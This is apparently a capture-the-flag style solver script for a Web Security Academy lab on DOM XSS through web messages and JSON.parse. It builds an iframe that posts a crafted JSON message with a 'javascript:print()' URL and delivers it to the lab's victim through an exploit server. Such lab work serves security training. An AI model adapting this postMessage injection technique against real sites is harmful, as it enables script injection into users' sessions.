#################################################################
#
# Lab: DOM XSS using web messages and JSON.parse
#
# Hack Steps:
#      1. Craft an iframe that, upon loading, will send an XSS
#         payload using the postMessage API
#      2. Deliver the exploit to the victim
#
#################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a2a009c04b068f08074588d001d00db.web-security-academy.net"

# Change this to your exploit server URL
EXPLOIT_SERVER_URL = "https://exploit-0a14009c04e668518074575c01ac00fe.exploit-server.net"

def main():
    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    xss_payload = r"""{ \"type\": \"load-channel\", \"url\": \"javascript:print()\" }"""
    payload = f"""<iframe src='{LAB_URL}' onload='this.contentWindow.postMessage("{xss_payload}","*")'>"""
    data = { "responseBody": payload, "responseHead": response_head, "formAction": "DELIVER_TO_VICTIM", "urlIsHttps": "on", "responseFile": "/exploit" }

    print("❯❯ Delivering the exploit to the victim.. ", end="", flush=True)
    
    try:
        requests.post(EXPLOIT_SERVER_URL, data)

    except:
        print(Fore.RED + "⦗!⦘ Failed to deliver the exploit to the victim through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()


